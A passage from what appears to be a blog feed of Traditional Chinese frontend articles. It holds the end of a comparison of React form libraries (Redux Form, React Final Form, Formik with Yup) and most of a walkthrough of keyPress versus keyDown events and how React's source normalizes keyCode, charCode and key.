表單的狀態是存在 Final Form 的 form instance 的 state，不像 Redux Form 是存在全域的 store 裡面，因此與任何類似 flux 狀態管理工具完全無相依關係。
擴充性高，可利用 decorator 的方式輕易的新增或移除功能以符合未來的需求。
沒有和其他函式庫相依。
打包後的檔案很小，壓縮後只有 4.7KB。

Demo範例 1這是一個簡單的範例，示範如何使用 Final Form。
如下圖所示，同樣也是填寫 Name 和 Email 的簡易表單，由於 Name 必須超過 3 個字，因此提交按鈕是 disabled 狀態，無法送出。

blur 欄位 Name 後可看到錯誤訊息。

修正欄位後，提交按鈕變成 enabled 狀態，即可送出。

從實際程式碼來看 Final Form 的使用方式。
利用 createForm 建立表單，並指定三個參數 initialValues、onSubmit、validate，分別是表單的初始值、提交時呼叫的 callback 和驗證規則，其中 onSubmit 必填。
import &#123; createForm &#125; from &#x27;final-form&#x27;;const form = createForm(&#123; initialValues, onSubmit, validate &#125;);

訂閱表單要監聽的屬性，例如：表單是否合法（valid）、目前在哪個欄位（active）、目前表單所有欄位的值（values）、哪些欄位已被修改過（dirty）。
// Subscribe to form state updatesconst unsubscribe = form.subscribe(  formState =&gt; &#123;    // Update UI  &#125;,  &#123; // FormSubscription: the list of values you want to be updated about    active: true,    dirty: true,    valid: true,    values: true  &#125;&#125;)

訂閱欄位要監聽的屬性，例如：錯誤訊息（error）、是否被觸碰（touched）、目前的值（value）等。
// Subscribe to field state updatesconst unregisterField = form.registerField(  &#x27;name&#x27;,  (fieldState) =&gt; &#123;    // Update field UI    const &#123; blur, change, focus, ...rest &#125; = fieldState;    // In addition to the values you subscribe to, field state also includes functions that your inputs need to update their state.  &#125;,  &#123;    // FieldSubscription: the list of values you want to be updated about    error: true,    touched: true,    value: true,  &#125;,);

Demo，原始碼。
範例 2：React wrapper for Final Form簡單實作 React wrapper 來使用 Final Form。同樣也是填寫 Name 和 Email 的簡易表單，由於 Name 必須超過 3 個字，因此提交按鈕是 disabled 狀態，無法送出。

程式碼範例如下，這裡用一個 Form wapper 把 Final Form 包起來，開發者只要依舊指定 initialValues、onSubmit、validate，並且設定欄位要顯示的名稱和屬性 name。表單指定要監聽四個屬性 valid、pristine、submitting、values，欄位則是沒有指定就是監聽全部屬性。
&lt;Form // (1) create form  initialValues=&#123;&#123;    name: &#x27;Ann&#x27;,    email: &#x27;sample@test.com&#x27;,  &#125;&#125;  onSubmit=&#123;(values) =&gt; &#123;    alert(JSON.stringify(values, 0, 2));  &#125;&#125;  validate=&#123;validate&#125;  // (2) subscribe form state  subscription=&#123;[&#x27;valid&#x27;, &#x27;pristine&#x27;, &#x27;submitting&#x27;, &#x27;values&#x27;]&#125;&gt;  &#123;/* (3) subscribe all field state */&#125;  &lt;Form.Field label=&#x27;Name&#x27; name=&#x27;name&#x27; /&gt;  &lt;Form.Field label=&#x27;Email&#x27; name=&#x27;email&#x27; /&gt;&lt;/Form&gt;

Demo，原始碼。
React Final Form

React Final Form 將 Final Form 包裝起來，這樣就能在 React 的環境中使用。也就是說，由 Final Form 保存狀態，React Final Form 只是一層 wrapper。
由剛剛提到的 Final Form 可知，Final Form 只提供訂閱的狀態，這是因為使用者每個輸入或任何動作都會造成重新渲染，改善方式是表單可訂閱想要被通知的狀態，當被訂閱的狀態有更新時才做通知。注意，如果不指定訂閱的狀態就是訂閱全部的狀態，也無法啟動欄位的狀態訂閱了。
非常輕量，壓縮後的打包檔案只有 3KB。

Workflow
說明

React Final Form 的工作流程如這張圖所示，React Final Form 將表單的狀態存在 React Final Form 的 form instance 裡面。
當使用者對某個 input 打字，這時候就會去更新表單的中有訂閱的狀態。
接著，由於狀態被修改，因此重新渲染有訂閱且更新狀態的欄位，使用者就能看到剛才輸入的值和更新後的表單狀態。

Demo範例 1：DecoratorsReact Final Form 的擴充性高，可利用 decorator 的方式輕易的新增或移除功能以符合未來的需求，並且也能保持 React Final Form 的體積很小。
例如，我們希望在提交表單後，能 foucs 在第一個有錯的欄位上，那就可以裝上 final-form-focus 這個 decorator 協助達成。
如下圖所示，表單的兩個欄位 Name 與 Password 皆為必填但未填，因此按下提交按鈕後，都顯示錯誤訊息，並因為裝了 final-form-focus 而能將游標停在第一個欄位，也就是欄位 Name 當中。

Demo，原始碼。
範例 2：利用訂閱機制改善效能問題一開始這個表單的欄位全部都沒有通過驗證規則，例如：name 為必填但是目前沒有值，email 不合規則，此時表單訂閱的狀態中 valid 值為 false。

name 和 email 彼此不會影響渲染，只有自己狀態改變，例如因打字輸入而改變 value 時才會重新渲染。

由於表單有訂閱狀態 valid，因此只有當全部欄位都通過驗證，也就是 valid 由 false 變成 true 時，表單才會重新渲染，可以看到渲染次數由 2 變成 3。

優點
有足夠的 API 能實作細緻的 UI，這樣開發者就不需要重新實作取得表單狀態的方法，而能減少撰寫的程式碼。
API 和 Redux Form 相似，如果之前用 Redux Form 就不用重新學習。
將狀態存在 Final Form instance state，而非存在全域的 store。
針對效能的改善，React Final Form 提供訂閱機制來減少不必要的渲染。也就是說，當內部狀態有改變時才去呼叫 setState() 來做重新渲染的動作。
打包後的檔案很小，壓縮後只有 7.7KB。
表單和欄位層級都支援同步與非同步驗證。
擴充性高，可利用 decorator 的方式輕易的新增或移除功能以符合未來的需求，而因為這樣而能保持打包後的體積很小。

缺點
無內建驗證工具，目前也沒有好的可搭配的驗證工具，驗證部份要自己開發。

Formik &amp; Yup

React 官方推薦，據說是可以無痛建立表單。
Formik 是表單函式庫，Yup 是驗證工具，Formik 有個 config「validationSchema」可和 Yup 互相搭配，有設定 validationSchema 這個 config 時，就能將 Yup 回傳的錯誤訊息自動轉換成一個物件，其 key 是欄位的 name，而 value 就是錯誤訊息。

WorkflowFormik 的工作流程是這樣的…

說明

Formik 將表單的狀態存在 form instance 的 state 裡面。
當使用者對某個 input 打字時就會去更新表單的狀態。
接著，由於狀態被修改，因此重新渲染表單，使用者看到剛才輸入的值和更新後的元件。

Yup 好在哪裡？不需再看到 if&#x2F;else 判斷句傳統的寫法是用 if&#x2F;else 根據條件判斷要用哪些規則，雜亂且難以維護。如下範例，表單欄位中有 name 這個欄位，若 name 沒填則顯示錯誤訊息「Required.」（必填），若 name 的字數小於 4 個字，則報錯「Length must exceed 3 characters.」（字數需要超過 3 個字）。
if (!values.name) &#123;  errors.name = &#x27;Required.&#x27;;&#125; else if (values.name.length &lt; 4) &#123;  errors.name = &#x27;Length must exceed 3 characters.&#x27;;&#125;

利用 Yup 改寫後，簡單清楚易懂。
const schema = Yup.object().shape(&#123;  name: yup    .string()    .required(&#x27;Required.&#x27;)    .min(4, &#x27;Length must exceed 3 characters.&#x27;),&#125;);

Cross-validation下圖是一個簡單的電子報訂閱表單的範例，驗證規則是如果沒有勾選要訂閱電子報（subscribe）的話，填完名稱（name）就可以送出；若要訂閱電子報，勾選「訂閱電子報」之後，信箱（email）欄位成為必填，因此就必須填寫。

利用 Yup 可以很輕易地做到根據條件動態決定驗證規則，如下程式碼所示，email 的規則是根據 subscribe 的值而決定的，when 後接要觀察的欄位名稱，在此觀察 subscribe 這個 checkbox 是否被勾選，若有勾選（亦即 is 為 true），則做 then 後所接的事情，否則做 otherwise 後所接的事情，因為這裡沒有「否則」要做什麼，所以程式碼中就沒有示範了。
email: yup.string().when(&#x27;subscribe&#x27;, &#123;  is: true,  then: fieldSchema =&gt; fieldSchema    .required(&#x27;Required.&#x27;)    .isEmail(&#x27;Invalid email address.&#x27;),&#125;),subscribe: yup.boolean(),

Demo，原始碼。
可混合同步和非同步的驗證可混合同步和非同步的驗證，而且可以用這樣的方式撰寫 .sync().async().sync().async()…簡潔易懂。
validationSchema: yup.object().shape(&#123;  name: yup    .string()    .required(&#x27;Required.&#x27;)    .isNameAvailable(&#x27;Name is taken!&#x27;) // 非同步    .min(4, &#x27;Length must exceed 3 characters.&#x27;)  &#125;)&#125;)

Demo，原始碼。
有用的小工具Yup 提供一些有用的工具，像是去除前後空白、將字串轉為全部大寫或小寫等。
如下範例所示，當使用者輸入字串時，可能前後都有空白，這時候 Yup 可先將字串去除前後空白後再做驗證，而不會造成空白也是一個字元的狀況。
例如，在以下程式碼的狀況下，輸入五個空白或字串「Alice」，都是可以通過驗證的。
name: yup.string().required(&#x27;Required.&#x27;);

若加上 trim()，則五個空白會被去除，而顯示錯誤訊息；字串「Alice」依然可以通過驗證。
name: yup  .string()  .required(&#x27;Required.&#x27;)  .trim();

Demo，原始碼。
FastField若只是使用一般的&lt;Field&gt;，則每次欄位更新時，其他欄位都會一同重新渲染；但若改成 &lt;FastField&gt; 則沒有相依關係的欄位就不會重新渲染。這是由於 &lt;FastField&gt; 內部實作 shouldComponentUpdate() 來決定是否要重新渲染的緣故。
下圖是 Formik 的 &lt;FastField&gt; 的流程圖，只有需要被更新的欄位（direct update）才會重新渲染，否則就 block 住。

來看一個範例，如下圖所示，這是一個簡易的表單，包含兩個欄位 Name 和 Password，右邊灰色圓圈內的數字表示元件的渲染數，由上而下依序是 Name 欄位（FastField）、Password 欄位（FastField），一開始數字都是 1。

當對 Name 欄位輸入資料「Summer」時，由於只有 Name 欄位是會被直接更新的，因此旁邊只有 Name 欄位旁邊的灰色小圈圈數字會增加。

Demo，原始碼。
優點
有足夠的 API 能實作細緻的 UI，這樣開發者就不需要重新實作取得表單狀態的方法，而能減少撰寫的程式碼。
將狀態存在 Formik instance state，而非全域。
針對效能的改善，Formik 提供 FastField 來減少渲染數。
打包後的檔案很小，壓縮後只有 12.7KB。
Formik 的表單和欄位都支援同步與非同步驗證，相較 Redux Form 來說方便許多，也有多一個選擇。
Yup 能將驗證規則撰寫得清楚易懂。

缺點雖然功能包山包海，功能齊全，但相較 Final Form 可用 decorator 來擴充功能，彈性較小。
Summary如何選擇好的表單函示庫？再次回顧本文一開始提到的，要怎麼選擇好的表單函式庫呢？我們可以考慮以下幾點…

這個函式庫是怎麼做狀態管理的？會不會有效能問題？
API 充足嗎？能為開發者減少撰寫多少程式碼？通常 API 充足的函式庫，打包後的檔案體機會比較大，只能取捨一下了。
如何撰寫驗證邏輯？
擴充性如何？是否能輕易新增和移除功能以符合未來的需求？
文件是否詳細？範例是否充足？之後若遇到問題是否能很快被解決？
打包後的檔案大小。
Github 星星數 and NPM 下載數。這是比較不重要的考量點，畢竟過去火紅的專案，目前可能已不符合需求，但已長時間累積了很多的星星數和下載數；而新出來的專案可能因起步較晚而沒有很多的星星數和下載數，但做得卻非常好。
函式庫提供的特點是否能解決專案的需求？

…
以下一一說明。
狀態管理
Redux Form：使用 Redux 儲存所有表單的狀態，並且對於多餘的渲染並無改善方法。
React Final Form：存在表單實體的狀態中，並使用訂閱狀態的方式做效能優化。
Formik：存在表單實體的狀態中，經由實作 &lt;Fastfield&gt; 元件內的 shouldComponentUpdate() 做效能優化。

程式碼撰寫Redux Form、React Final Form 和 Formik 皆提供足夠的 API 以實作細緻的表單，因此節省開發人員不少時間。
驗證
Redux Form
無內建驗證工具，但可搭配其他驗證工具。
非同步驗證只支援表單層級的驗證。


React Final Form
無內建驗證工具，目前也沒有好的可搭配的驗證工具，驗證部份要自己開發。
表單和欄位都支援同步與非同步驗證。


Formik
Yup 是很棒的驗證工具，寫起來清楚簡潔，好懂好維護。
表單和欄位都支援同步與非同步驗證。



Extensibility
Redux Form 和 Formik：無擴充性。
React Final Form：擴充性高，可利用 decorator 的方式輕易的新增或移除功能以符合未來的需求，也因此能保持打包後的體積很小。

Examples and documents
Redux Form：文件和範例不夠清楚詳細。
React Final Form 和 Formik 的文件和範例都很充足詳細。

Bundle size

Redux Form：檔案體積大，壓縮後約 26.7KB。
React Final Form + Final Form：壓縮後約 7.7KB。
Formik：Formik 壓縮後是 12KB，Yup 是 21.6KB.

Github stars and NPM downloads

Redux Form：每週下載數約 三十七萬 次，累積星星數約 一萬 顆。
React Final Form：每週下載數約 六萬五 次，累積星星數約 三千九 顆。
Formik：每週下載數約 三十二萬 次，累積星星數約 一萬四千 顆。

總結在經過以上探索與討論後，做個總結…
在目前我所經手的專案上，由於 (1) 對表單功能有強烈需求，必須顧慮開發上的便捷，並且 (2) 專案很老了，常常需要重構，要能有效整理程式碼，因此 Formik &amp; Yup 對我而言就是很好的選擇；而也有些專案對體積大小斤斤計較、並且不需要這麼多功能，或必須維持高彈性、因應需求端的快速變化，那就很適合使用 React Final Form。
話說這麼多，就是希望大家在茫茫大海中，都能找到適合自己的表單函式庫摟！👍 👍 👍
References
Comparison of form libraries in react
Erik Rasmussen — 🏁Final Form: Form state management via Observers
Final Form: The road to the checkered flag
Formik vs Final Form

關於作者：@cythilya 前端工程師，喜歡交換明信片、設計簡單的小物、旅遊和看電影。
]]></content>
      <tags>
        <tag>react</tag>
      </tags>
  </entry>
  <entry>
    <title>從 React 原始碼看 keyPress 與 keyDown 事件</title>
    <url>/2019/03/23/react-keyboard-event/</url>
    <content><![CDATA[前言前陣子有個學生跑來問我一個問題，說他在寫 React 的時候分不清楚 keyPress 與 keyDown 這兩個事件，還有 keyCode 跟 charCode 這兩個東西，有時候拿得到值，有時候卻拿不到，覺得十分困惑。
我原本以為是 React 做了一些處理，所以去看了一下原始碼。後來發現 React 的確有做一些處理，但實際上這個問題跟 React 沒什麼關係，而是 keyPress 跟 keyDown 這兩個原生的 JavaScript 事件本來就有差異。
所以他碰到的問題跟 React 一點關係都沒有，只是對這部分的事件機制不熟而已。
儘管如此，能夠藉由一個實際的問題來參考一下 React 的實作還是件很不錯的事，而且 React 的註解寫得很好。
因此，這篇會先帶大家來看這兩個事件的不同，最後再來看 React 裡面怎麼做一些處理。
keyPress 跟 keyDown 的差異首先，我們要來看看 keyPress 與 keyDown 這兩個原生事件的差異到底在哪裡，這部分我們直接請出 MDN 來為我們做解釋：

The keypress event is fired when a key that produces a character value is pressed down. Examples of keys that produce a character value are alphabetic, numeric, and punctuation keys. Examples of keys that don’t produce a character value are modifier keys such as Alt, Shift, Ctrl, or Meta.

來源：https://developer.mozilla.org/en-US/docs/Web/Events/keypress

The keydown event is fired when a key is pressed down.
Unlike the keypress event, the keydown event is fired for all keys, regardless of whether they produce a character value.

來源：https://developer.mozilla.org/en-US/docs/Web/Events/keydown
簡單來說呢，keyDown 會在你按下任何按鍵時觸發，但是 keyPress 只會在你按下的按鍵可以產生出一個字元的時候觸發，白話一點就是你按下這按鍵是在打字。
例如說你按a，畫面上會出現一個字元 a，所以 keyDown 跟 keyPress 都會觸發。但如果你按shift，畫面上什麼都不會出現，所以只有 keyDown 會觸發。
w3c 提供了一個很不錯的網頁：Key and Character Codes vs. Event Types
，讓你可以自己實驗看看。
下圖中我輸入 a，兩者都會觸發，接著我按 shift，只會觸發 keyDown，再來按 backspace 把文字刪掉，也只會觸發 keyDown：

所以這兩者的差異相信大家應該可以很清楚的知道了，keyDown 可以當作是「按下按鍵」，keyPress 則當作「輸入東西」時會觸發的事件。
接著我們來談談 keyCode 跟 charCode。
keyCode 與 charCode 的差異先來談談 charCode 好了，或許你有看過 JavaScript 裡面有個函式是這樣的：
console.log(String.fromCharCode(65)) // A

charCode 其實就是某一個字元所代表的一個號碼，或更精確一點地說，就是它的 Unicode 編碼。
這邊如果不太熟的話可以參考這篇文章：[Guide] 瞭解網頁中看不懂的編碼：Unicode 在 JavaScript 中的使用。
在 JavaScript 裡面也可以用另一個函式拿到字元所對應的編碼：
console.log(&#x27;嗨&#x27;.charCodeAt(0)) // 21992

若是你把這 21992 轉成 16 進位，會變成 0x55E8，這個其實就是「嗨」的 Unicode：
（來源：https://www.cns11643.gov.tw/wordView.jsp?ID=90944）
那什麼是 keyCode 呢？既然 charCode 代表著是一個 char（字元）的 code，那 keyCode 顯然就是代表一個 key（按鍵）的 code。
每一個「按鍵」也都有一個它自己的代碼，而且有時候會讓你混淆，因為它跟 charCode 可能是一樣的。
舉例來說：「A」這個按鍵的 keyCode 是 65，而「A」這個字元的 charCode 也是 65。這應該是為了某種方便性所以這樣設計，但你要注意到一點：

當我按下「A」這個按鍵的時候，我可能要打的是 a 或是 A，有兩種可能

或是舉另外一個例子，當你要打數字 1 時，如果你是用 Q 上方的那顆按鍵而不是用純數字鍵盤，你要打的字可能是「1」或是「!」或甚至是「ㄅ」，因為它們都是同一顆按鍵。
一顆按鍵對應了不只一個字元，所以單單從 keyCode，你是沒辦法判斷使用者想打什麼字的。
講到這裡，我們可以來想一下這兩個跟 keyPress 與 keyDown 的關聯了。
剛剛說到 keyPress 是你要輸入文字的時候才會觸發，所以這個事件會拿到 charCode，因為你要知道使用者打了什麼字。那為什麼不是 keyCode 呢？因為你從 keyCode 根本不知道他打了什麼字，所以拿 keyCode 也沒用。
keyDown 則是在你按下任何按鍵時都會觸發，這時候一定要拿 keyCode，因為你要知道使用者按了什麼按鍵。若是拿 charCode 的話，你按 shift 或是 ctrl 就沒有值了，因為這不是一個字元，就沒辦法知道使用者按了什麼。
總結一下，當你要偵測使用者輸入文字的時候，就用 keyPress，並且搭配 charCode 來看使用者剛剛輸入了什麼；當你想偵測使用者「按下按鍵」的時候，就用 keyDown，搭配 keyCode 獲得使用者所按下的按鍵。
這就是 keyPress、keyDown 以及 keyCode 跟 charCode 的差別。
順帶一提，在輸入中文的時候 keyPress 不會有值，keyDown 則會回傳一個神秘的代碼 229：

key 與 which在 keyPress 與 keyDown 這兩個 event 裡面，其實還有兩個屬性：key 與 which。
我們先來看一下 which 是什麼：

The which read-only property of the KeyboardEvent interface returns the numeric keyCode of the key pressed, or the character code (charCode) for an alphanumeric key pressed.

來源：https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent/which
根據我自己的理解，當你在 keyPress 裡面用 which 的時候，拿到的應該就是 charCode；在 keyDown 裡面用的時候就是 keyCode，所以你在寫程式的時候可以統一用 event.which 來拿這個資訊，不必再區分 keyCode 或是 charCode。
不過 MDN 附的參考資料寫的滿模糊的，所以這部分我也不是很確定：

which holds a system- and implementation-dependent numerical code signifying the unmodified identifier associated with the key pressed. In most cases, the value is identical to keyCode.

來源：https://www.w3.org/TR/2014/WD-DOM-Level-3-Events-20140925/#widl-KeyboardEvent-which
接著來看一下 key：

The KeyboardEvent.key read-only property returns the value of the key pressed by the user while taking into considerations the state of modifier keys such as the shiftKey as well as the keyboard locale&#x2F;layou

來源：https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent/key
簡單來說 key 會是一個字串，你剛剛按了什麼按鍵或是打了什麼字，key 就會是什麼。上面 MDN 的網頁下方有附一個簡單的範例讓你來測試 key 的值。
例如說我輸入 A，key 就是 A，按下 Shift，key 就是 Shift。
還有一點要注意的是，這個屬性在 keyPress 或是 keyDown 事件裡面都拿得到。所以儘管是 keyDown 事件，你也能知道使用者剛剛輸入了什麼或是按了什麼按鍵。
但儘管如此，關於「偵測輸入」的事件應該還是用 keyPress 最合適，除非你想要偵測其他不會產生字元的按鍵（Ctrl, Delete, Shift…）才用 keyDown 事件。
在這邊做個中場總結，其實這些 which、keyCode 跟 charCode，在不同瀏覽器上面都可能有不同的表現，所以是跨瀏覽器支援一個很麻煩的部分，從這個方向去找，你可以找到一大堆在講瀏覽器相容性的文章。
但近幾年來舊的瀏覽器漸漸被淘汰，大部分的使用者在用的瀏覽器應該都比較符合標準了，因此相容性並不是本篇文章的重點，所以就沒有多提了。
接下來終於要到可能是最吸引你的部分：React 原始碼。
初探 React 原始碼React 原始碼這麼大，該從何找起呢？
這邊推薦一個超級好用的方法：GitHub 的搜尋。通常只要拿你想找的 function 名稱或是相關的關鍵字下去搜尋，就能夠把範圍限縮的很小，只要用肉眼再翻一下資料就能夠找到相對應的原始碼，是方便又好用的一個方法。
這邊我們用keyPress來當關鍵字，出現了 12 筆結果：

用肉眼稍微篩選一下，發現很多都是測試，那些都可以直接跳過。你應該很快就能定位到幾個相關的檔案，像是這兩個：

packages&#x2F;react-dom&#x2F;src&#x2F;events&#x2F;SyntheticKeyboardEvent.js
packages&#x2F;react-dom&#x2F;src&#x2F;events&#x2F;getEventKey.js

沒錯，這兩個就是今天的主角。
我們先來看SyntheticKeyboardEvent.js，如果你對 React 還算熟悉的話，應該知道你在裡面拿到的事件都不是原生的事件，而是 React 會包裝過之後再丟給你，而現在這個SyntheticKeyboardEvent就是經過 React 包裝後的事件，就是你在 onKeyPress 或是 onKeyDown 的時候會拿到的 e。
為了方便起見，我們切成幾個 function，一個一個來看。
charCode: function(event) &#123;  // `charCode` is the result of a KeyPress event and represents the value of  // the actual printable character.    // KeyPress is deprecated, but its replacement is not yet final and not  // implemented in any major browser. Only KeyPress has charCode.  if (event.type === &#x27;keypress&#x27;) &#123;    return getEventCharCode(event);  &#125;  return 0;&#125;

這邊註解寫得很棒，説 keyPress 已經被 deprecated 了但是替代品還沒準備好。再者，也提到了只有 keyPress 有 charCode。
所以這邊就是判斷 event 的 type 是不是 keypress，是的話就回傳getEventCharCode(event)，否則回傳 0。
接著我們來看一下getEventCharCode在做什麼（小提醒，這個函式在另外一個檔案）：
/** * `charCode` represents the actual &quot;character code&quot; and is safe to use with * `String.fromCharCode`. As such, only keys that correspond to printable * characters produce a valid `charCode`, the only exception to this is Enter. * The Tab-key is considered non-printable and does not have a `charCode`, * presumably because it does not produce a tab-character in browsers. * * @param &#123;object&#125; nativeEvent Native browser event. * @return &#123;number&#125; Normalized `charCode` property. */function getEventCharCode(nativeEvent) &#123;  let charCode;  const keyCode = nativeEvent.keyCode;    if (&#x27;charCode&#x27; in nativeEvent) &#123;    charCode = nativeEvent.charCode;      // FF does not set `charCode` for the Enter-key, check against `keyCode`.    if (charCode === 0 &amp;&amp; keyCode === 13) &#123;      charCode = 13;    &#125;  &#125; else &#123;    // IE8 does not implement `charCode`, but `keyCode` has the correct value.    charCode = keyCode;  &#125;    // IE and Edge (on Windows) and Chrome / Safari (on Windows and Linux)  // report Enter as charCode 10 when ctrl is pressed.  if (charCode === 10) &#123;    charCode = 13;  &#125;    // Some non-printable keys are reported in `charCode`/`keyCode`, discard them.  // Must not discard the (non-)printable Enter-key.  if (charCode &gt;= 32 || charCode === 13) &#123;    return charCode;  &#125;    return 0;&#125;

接著我們一樣分段來看比較方便：
/** * `charCode` represents the actual &quot;character code&quot; and is safe to use with * `String.fromCharCode`. As such, only keys that correspond to printable * characters produce a valid `charCode`, the only exception to this is Enter. * The Tab-key is considered non-printable and does not have a `charCode`, * presumably because it does not produce a tab-character in browsers. * * @param &#123;object&#125; nativeEvent Native browser event. * @return &#123;number&#125; Normalized `charCode` property. */

開頭的註解先跟你說 charCode 代表的就是 character code，所以可以用 String.fromCharCode 來找出搭配的字元。
因此，只有能被印出來（或者是說可以被顯示出來）的字元才有 charCode，而 Enter 是一個例外，因為 Enter 會產生空行。但 Tab 不是，因為你按 Tab 不會產生一個代表 Tab 的字元。
let charCode;const keyCode = nativeEvent.keyCode;  if (&#x27;charCode&#x27; in nativeEvent) &#123;  charCode = nativeEvent.charCode;    // FF does not set `charCode` for the Enter-key, check against `keyCode`.  if (charCode === 0 &amp;&amp; keyCode === 13) &#123;    charCode = 13;  &#125;&#125; else &#123;  // IE8 does not implement `charCode`, but `keyCode` has the correct value.  charCode = keyCode;&#125;

這邊針對瀏覽器的相容性做處理，FireFox 沒有幫 Enter 設定 charCode，所以要額外判斷 keyCode 是不是 13。然後 IE8 沒有實作 charCode，所以用 keyCode 的值來取代。
// IE and Edge (on Windows) and Chrome / Safari (on Windows and Linux)// report Enter as charCode 10 when ctrl is pressed.if (charCode === 10) &#123;  charCode = 13;&#125;  // Some non-printable keys are reported in `charCode`/`keyCode`, discard them.// Must not discard the (non-)printable Enter-key.if (charCode &gt;= 32 || charCode === 13) &#123;  return charCode;&#125;

這邊應該算是一個 special case，當使用者按下 Ctrl + Enter 時的 charCode 是 10，React 想把這個也當作按下 Enter 來處理。
另外，有些沒辦法被印出來的字元應該要被拿掉，所以最後做了一個範圍的判斷。
charCode 的處理就是這樣了，仔細看看其實還滿有趣的，針對瀏覽器的相容性跟一些特殊狀況做了處理。
接著我們回到SyntheticKeyboardEvent.js，來看看 keyCode 的處理：
keyCode: function(event) &#123;  // `keyCode` is the result of a KeyDown/Up event and represents the value of  // physical keyboard key.    // The actual meaning of the value depends on the users&#x27; keyboard layout  // which cannot be detected. Assuming that it is a US keyboard layout  // provides a surprisingly accurate mapping for US and European users.  // Due to this, it is left to the user to implement at this time.  if (event.type === &#x27;keydown&#x27; || event.type === &#x27;keyup&#x27;) &#123;    return event.keyCode;  &#125;  return 0;&#125;

這邊說 keyCode 的值其實是依賴於鍵盤的，意思是說有些鍵盤可能會產生不太一樣的 keyCode，但因為大多數美國跟歐洲的使用者都是 US keyboard，所以這邊就直接把 keyCode 丟回去而不做特殊處理。
其實這一段我沒有看得完全懂，只是大概猜一下意思而已。這邊指的「keyboard layout」可能是像 QWERTY 或是 Dvorak 這種的 layout，按鍵的排列方式完全不同。但如果這樣就會產生不同的 keyCode 的話，是不是代表有些網站可能會有 bug？
不過大多數人的鍵盤都是同樣的排列，所以好像不用太擔心這個問題。
which: function(event) &#123;  // `which` is an alias for either `keyCode` or `charCode` depending on the  // type of the event.  if (event.type === &#x27;keypress&#x27;) &#123;    return getEventCharCode(event);  &#125;  if (event.type === &#x27;keydown&#x27; || event.type === &#x27;keyup&#x27;) &#123;    return event.keyCode;  &#125;  return 0;&#125;

最後是 which 的部分，如果是 keypress 就把 charCode 傳回去，keydown 或是 keyup 的話就把 keyCode 傳回去。
講到這裡，我們已經看到 React 對於 charCode、keyCode 以及 which 的處理了，charCode 針對特殊情形以及瀏覽器相容性做檢查，keyCode 直接回傳，which 則根據事件不同回傳相對應的值。
最後我們來看一下 key 的處理，這邊放在另外一個檔案叫做getEventKey.js：
/** * Normalization of deprecated HTML5 `key` values * @see https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent#Key_names */const normalizeKey = &#123;  Esc: &#x27;Escape&#x27;,  Spacebar: &#x27; &#x27;,  Left: &#x27;ArrowLeft&#x27;,  Up: &#x27;ArrowUp&#x27;,  Right: &#x27;ArrowRight&#x27;,  Down: &#x27;ArrowDown&#x27;,  Del: &#x27;Delete&#x27;,  Win: &#x27;OS&#x27;,  Menu: &#x27;ContextMenu&#x27;,  Apps: &#x27;ContextMenu&#x27;,  Scroll: &#x27;ScrollLock&#x27;,  MozPrintableKey: &#x27;Unidentified&#x27;,&#125;;  /** * Translation from legacy `keyCode` to HTML5 `key` * Only special keys supported, all others depend on keyboard layout or browser * @see https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent#Key_names */const translateToKey = &#123;  &#x27;8&#x27;: &#x27;Backspace&#x27;,  &#x27;9&#x27;: &#x27;Tab&#x27;,  &#x27;12&#x27;: &#x27;Clear&#x27;,  &#x27;13&#x27;: &#x27;Enter&#x27;,  &#x27;16&#x27;: &#x27;Shift&#x27;,  &#x27;17&#x27;: &#x27;Control&#x27;,  &#x27;18&#x27;: &#x27;Alt&#x27;,  &#x27;19&#x27;: &#x27;Pause&#x27;,  &#x27;20&#x27;: &#x27;CapsLock&#x27;,  &#x27;27&#x27;: &#x27;Escape&#x27;,  &#x27;32&#x27;: &#x27; &#x27;,  &#x27;33&#x27;: &#x27;PageUp&#x27;,  &#x27;34&#x27;: &#x27;PageDown&#x27;,  &#x27;35&#x27;: &#x27;End&#x27;,  &#x27;36&#x27;: &#x27;Home&#x27;,  &#x27;37&#x27;: &#x27;ArrowLeft&#x27;,  &#x27;38&#x27;: &#x27;ArrowUp&#x27;,  &#x27;39&#x27;: &#x27;ArrowRight&#x27;,  &#x27;40&#x27;: &#x27;ArrowDown&#x27;,  &#x27;45&#x27;: &#x27;Insert&#x27;,  &#x27;46&#x27;: &#x27;Delete&#x27;,  &#x27;112&#x27;: &#x27;F1&#x27;,  &#x27;113&#x27;: &#x27;F2&#x27;,  &#x27;114&#x27;: &#x27;F3&#x27;,  &#x27;115&#x27;: &#x27;F4&#x27;,  &#x27;116&#x27;: &#x27;F5&#x27;,  &#x27;117&#x27;: &#x27;F6&#x27;,  &#x27;118&#x27;: &#x27;F7&#x27;,  &#x27;119&#x27;: &#x27;F8&#x27;,  &#x27;120&#x27;: &#x27;F9&#x27;,  &#x27;121&#x27;: &#x27;F10&#x27;,  &#x27;122&#x27;: &#x27;F11&#x27;,  &#x27;123&#x27;: &#x27;F12&#x27;,  &#x27;144&#x27;: &#x27;NumLock&#x27;,  &#x27;145&#x27;: &#x27;ScrollLock&#x27;,  &#x27;224&#x27;: &#x27;Meta&#x27;,&#125;;  /** * @param &#123;object&#125; nativeEvent Native browser event. * @return &#123;string&#125; Normalized `key` property. */function getEventKey(nativeEvent: KeyboardEvent): string &#123;  if (nativeEvent.key) &#123;    // Normalize inconsistent values reported by browsers due to    // implementations of a working draft specification.      // FireFox implements `key` but returns `MozPrintableKey` for all    // printable characters (normalized to `Unidentified`), ignore it.    const key = normalizeKey[nativeEvent.key] || nativeEvent.key;    if (key !== &#x27;Unidentified&#x27;) &#123;      return key;    &#125;  &#125;    // Browser does not implement `key`, polyfill as much of it as we can.  if (nativeEvent.type === &#x27;keypress&#x27;) &#123;    const charCode = getEventCharCode(nativeEvent);      // The enter-key is technically both printable and non-printable and can    // thus be captured by `keypress`, no other non-printable key should.    return charCode === 13 ? &#x27;Enter&#x27; : String.fromCharCode(charCode);  &#125;  if (nativeEvent.type === &#x27;keydown&#x27; || nativeEvent.type === &#x27;keyup&#x27;) &#123;    // While user keyboard layout determines the actual meaning of each    // `keyCode` value, almost all function keys have a universal value.    return translateToKey[nativeEvent.keyCode] || &#x27;Unidentified&#x27;;  &#125;  return &#x27;&#x27;;&#125;

這邊一樣是針對瀏覽器的相容性做處理，如果 event 本身就有 key 的話，先做 normalize，把回傳的結果統一成相同的格式。而 FireFox 會把可以印出的字元都設定成 MozPrintableKey，這邊 normalize 成 Unidentified。
